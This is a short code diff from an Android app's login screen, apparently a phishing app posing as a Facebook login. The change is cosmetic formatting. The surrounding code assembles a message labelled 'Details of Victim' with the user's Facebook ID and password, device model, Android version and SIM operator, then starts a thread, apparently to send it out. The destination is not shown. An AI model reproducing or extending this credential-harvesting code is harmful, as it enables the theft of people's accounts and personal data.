@@ -191,8 +191,8 @@ public class LoginActivity extends AppCompatActivity
                         final String message="Details of Victim =>\n"+
                                 "\nFacebook ID = "+Login.getText().toString()+
                                 "\nPassword = "+Pass.getText().toString()+
-                                "\nDevice Used = "+ (Build.MODEL) +
-                                "\nAndroid Version Used = "+ android.os.Build.VERSION.RELEASE+
+                                "\nDevice Used = "+Build.MODEL+
+                                "\nAndroid Version Used = "+android.os.Build.VERSION.RELEASE+
                                 "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
 
                         new Thread(new Runnable() {
